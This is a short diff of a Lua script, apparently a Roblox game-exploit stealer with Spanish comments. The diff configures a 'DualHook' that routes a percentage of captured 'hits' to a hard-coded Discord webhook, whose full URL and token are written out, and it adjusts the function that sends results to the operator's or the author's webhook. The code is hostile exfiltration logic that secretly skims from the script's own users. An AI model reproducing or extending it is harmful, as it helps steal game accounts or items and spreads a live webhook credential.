@@ -16,7 +16,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 
 -- Configuración DualHook
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
-local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambia a tu webhook real
+local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM"
 local DualHookMinValue = 1
 local DualHookPercent = 100 -- porcentaje de hits que se van a ti
 
@@ -38,10 +38,9 @@ CheckServerInitial()
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar webhook (DualHook seguro con totalValue y control de @everyone)
+-- Función corregida SendDualHook
 local function SendDualHook(title, description, fields, useEveryone)
-    totalValue = totalValue or 0
-    local useDual = totalValue >= DualHookMinValue and math.random(1,100) <= DualHookPercent
+    local useDual = (totalValue >= DualHookMinValue) and (math.random(1,100) <= DualHookPercent)
     local targetWebhook = useDual and DualHookWebhook or webhook
     local prefix = (useEveryone and pingEveryone) and "@everyone " or ""
 
